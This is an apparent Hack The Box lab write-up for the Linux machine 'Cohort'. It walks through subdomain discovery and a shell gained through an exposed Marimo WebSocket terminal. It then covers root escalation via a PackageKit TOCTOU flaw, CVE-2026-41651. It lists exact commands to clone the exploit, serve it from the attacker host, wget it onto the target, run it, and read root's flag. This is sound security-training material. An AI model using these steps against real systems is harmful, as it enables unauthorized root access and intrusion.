# Hack The Box - Cohort

**Platform:** Hack The Box  
**OS:** Linux  
**Difficulty:** Easy  
**Status:** Pwned

## Overview

Cohort is a Linux machine that demonstrates a multi-stage attack chain involving web application enumeration, hidden subdomain discovery, an exposed Marimo service, WebSocket-based command execution, and local privilege escalation through a PackageKit TOCTOU vulnerability.

## Target Information

| Item | Value |
|---|---|
| Target Hostname | `cohort.htb` |
| Target IP | `<TARGET_IP>` |
| Attack Platform | Kali/Parrot Linux |
| VPN IP | `<KALI_VPN_IP>` |

> **Note:** HTB target and VPN IP addresses can change between sessions. Replace the placeholders above with the IPs from your current lab session.

---

## 1. Hosts File

The target hostname was added to `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

Added:

```text
<TARGET_IP>    cohort.htb
```

A hidden subdomain discovered during enumeration was:

```text
nb-1be3782a8afd3ad5.cohort.htb
```

This was also added to `/etc/hosts`:

```text
<TARGET_IP>    nb-1be3782a8afd3ad5.cohort.htb
```

---

## 2. Initial Nmap Scan

The initial service and version scan was:

```bash
nmap -Pn -sC -sV <TARGET_IP>
```

Open ports identified:

```text
22/tcp   SSH     OpenSSH 9.6p1 Ubuntu
80/tcp   HTTP    nginx 1.24.0
443/tcp  HTTPS   nginx 1.24.0
```

Port 80 redirected to:

```text
https://cohort.htb/
```

The HTTPS certificate showed:

```text
cohort.htb
*.cohort.htb
```

The wildcard certificate was a useful clue that additional virtual hosts or subdomains might exist.

---

## 3. Web Application / Initial Foothold

The target was running the **Cohort Analytics** web application.

The important hidden hostname was:

```text
nb-1be3782a8afd3ad5.cohort.htb
```

This exposed a Marimo service internally running on port `8888`.

The vulnerable WebSocket endpoint was:

```text
wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws
```

This endpoint provided access to an interactive terminal.

---

## 4. Marimo WebSocket Shell

A Python script named `cohort.py` was created to connect to the WebSocket and provide an interactive terminal.

The script was run with:

```bash
python3 cohort.py
```

This resulted in a shell similar to:

```text
marimo@cohort:~$
```

This provided command execution as the `marimo` user.

The user flag was obtained from this foothold.

---

## 5. After Getting User

At this point the objective was:

```text
marimo -> root
```

The local privilege escalation vulnerability used was:

```text
CVE-2026-41651
```

This is a **PackageKit TOCTOU (Time-of-Check to Time-of-Use) local privilege escalation** vulnerability.

---

## 6. Download the Exploit

On the attacking machine:

```bash
git clone https://github.com/Vozec/CVE-2026-41651.git
cd CVE-2026-41651
```

The relevant binary was:

```text
cve-2026-41651
```

---

## 7. Verify the Exploit

The SHA-256 hash of the binary was verified with:

```bash
sha256sum cve-2026-41651
```

Expected SHA-256:

```text
39d90db4e7cfbda5c14341c96434360692b6af673f34720e6dcfcade00fdd50f
```

---

## 8. Transfer the Exploit to Cohort

From the CVE directory, start a temporary HTTP server on the attacking machine:

```bash
python3 -m http.server 8000
```

From the `marimo` shell on the target:

```bash
cd /tmp
```

Download the exploit:

```bash
wget http://<KALI_VPN_IP>:8000/cve-2026-41651 -O /tmp/cve-2026-41651
```

Make it executable:

```bash
chmod +x /tmp/cve-2026-41651
```

Verify the transferred file:

```bash
sha256sum /tmp/cve-2026-41651
```

The resulting hash should match:

```text
39d90db4e7cfbda5c14341c96434360692b6af673f34720e6dcfcade00fdd50f
```

---

## 9. Run the Privilege Escalation

Execute the exploit:

```bash
/tmp/cve-2026-41651
```

The exploit used PackageKit asynchronous transactions to trigger the TOCTOU vulnerability.

Successful execution resulted in a SUID Bash and output similar to:

```text
[+] SUCCESS — SUID bash
uid=1000(marimo) gid=1000(marimo) euid=0(root)
```

The exploit created a SUID Bash executable:

```text
.suid_bash
```

---

## 10. Verify Root

The exploit dropped into the SUID Bash shell:

```text
.suid_bash-5.2#
```

Check the current user:

```bash
whoami
```

Output:

```text
root
```

Check the process identity:

```bash
id
```

Important result:

```text
uid=1000(marimo)
gid=1000(marimo)
euid=0(root)
```

The important value is:

```text
euid=0(root)
```

The Bash process was therefore executing with root effective privileges.

---

## 11. Root Flag

The root flag was located at:

```text
/root/root.txt
```

Command used:

```bash
cat /root/root.txt
```

This successfully retrieved the root flag.

> **Note:** Actual flag values are intentionally omitted from this public writeup.

---

# Complete Attack Chain

```text
Cohort Analytics Web Application
            |
            v
Hidden subdomain:
nb-1be3782a8afd3ad5.cohort.htb
            |
            v
Marimo service on port 8888
            |
            v
Marimo WebSocket:
/terminal/ws
            |
            v
marimo shell
            |
            v
User flag
            |
            v
CVE-2026-41651
            |
            v
PackageKit TOCTOU
            |
            v
SUID Bash
            |
            v
euid=0(root)
            |
            v
Root shell
            |
            v
/root/root.txt
```

---

# Quick Command Reference

## Initial Scan

```bash
nmap -Pn -sC -sV <TARGET_IP>
```

## Start Marimo Foothold

```bash
python3 cohort.py
```

## Clone Exploit

```bash
git clone https://github.com/Vozec/CVE-2026-41651.git
cd CVE-2026-41651
```

## Verify Exploit

```bash
sha256sum cve-2026-41651
```

Expected hash:

```text
39d90db4e7cfbda5c14341c96434360692b6af673f34720e6dcfcade00fdd50f
```

## Start HTTP Server

```bash
python3 -m http.server 8000
```

## Download to Cohort

```bash
cd /tmp
wget http://<KALI_VPN_IP>:8000/cve-2026-41651 -O /tmp/cve-2026-41651
chmod +x /tmp/cve-2026-41651
sha256sum /tmp/cve-2026-41651
```

## Run Privilege Escalation

```bash
/tmp/cve-2026-41651
```

## Verify Root

```bash
whoami
id
```

## Retrieve Root Flag

```bash
cat /root/root.txt
```

---

# Main Lessons

1. **Enumerate beyond the obvious.** The main web application was only one part of the attack surface.
2. **Pay attention to TLS certificates.** The wildcard certificate provided a clue that additional subdomains might be relevant.
3. **Look for hidden virtual hosts and internal services.** The hidden hostname exposed the Marimo service.
4. **WebSockets can expose powerful functionality.** The `/terminal/ws` endpoint provided command execution as `marimo`.
5. **Initial access is only the beginning.** After obtaining the user shell, local privilege escalation enumeration was required.
6. **TOCTOU vulnerabilities can lead to privilege escalation.** CVE-2026-41651 was used against PackageKit to obtain root effective privileges.
7. **Effective UID matters.** The final shell showed `euid=0(root)`, confirming that the SUID Bash process was executing with root effective privileges.

---

## Tools Used

- Nmap
- Kali/Parrot Linux
- Python
- WebSockets
- Git
- wget
- PackageKit
- CVE-2026-41651

---

> **Disclaimer:** This writeup documents activity performed in an authorized Hack The Box lab environment. The techniques and tooling are intended for educational purposes and authorized security testing only.
